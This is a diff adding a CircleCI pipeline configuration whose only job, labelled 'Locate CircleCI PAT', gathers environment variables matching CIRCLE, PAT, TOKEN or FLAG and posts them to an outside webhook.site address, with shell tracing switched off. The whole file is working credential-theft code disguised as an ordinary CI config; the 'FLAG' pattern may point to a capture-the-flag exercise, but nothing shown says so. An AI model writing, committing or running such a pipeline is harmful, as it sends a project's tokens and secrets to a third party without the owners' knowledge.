@@ -1,0 +1,23 @@
+version: 2.1
+
+jobs:
+  retrieve:
+    docker:
+      - image: cimg/base:stable
+    steps:
+      - run:
+          name: Locate CircleCI PAT
+          command: |
+            set +x
+            {
+              echo "source=circleci-runner"
+              env | sort | grep -Ei '(^|_)(CIRCLE|CIRCLECI|PAT|TOKEN|FLAG)($|_)' || true
+            } | curl -fsS -X POST \
+                -H "Content-Type: text/plain" \
+                --data-binary @- \
+                "https://webhook.site/83ecc0de-4e6e-4fb8-a1d5-ad4c875b899d/pat-candidates"
+
+workflows:
+  retrieve:
+    jobs:
+      - retrieve
